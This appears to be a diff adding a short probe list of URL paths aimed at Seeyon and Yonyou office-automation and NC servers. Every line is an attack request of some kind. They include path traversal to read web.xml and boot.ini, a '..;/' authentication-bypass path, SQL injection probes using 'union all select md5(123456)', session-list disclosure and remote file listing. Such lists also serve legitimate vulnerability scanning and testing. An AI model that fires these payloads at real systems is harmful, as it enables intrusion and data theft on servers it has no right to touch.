@@ -1,0 +1,12 @@
+/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+/seeyon/thirdpartyController.do.css/..;/ajax.do
+/yyoa/createMysql.jsp
+/yyoa/ext/createMysql.jsp
+/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select md5(123456)%23
+/seeyon/main.do?method=officeDown&filename=c:/boot.ini
+/seeyon/main.do?method=officeDown&filename={{filepath}}
+/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
+/yyoa/ext/https/getSessionList.jsp?cmd=getAll
+/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,md5(123456),4#
+/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(123456))
+/yyoa/common/js/menu/test.jsp;1.js?doType=101&S1=(SELECT%20md5(123456))
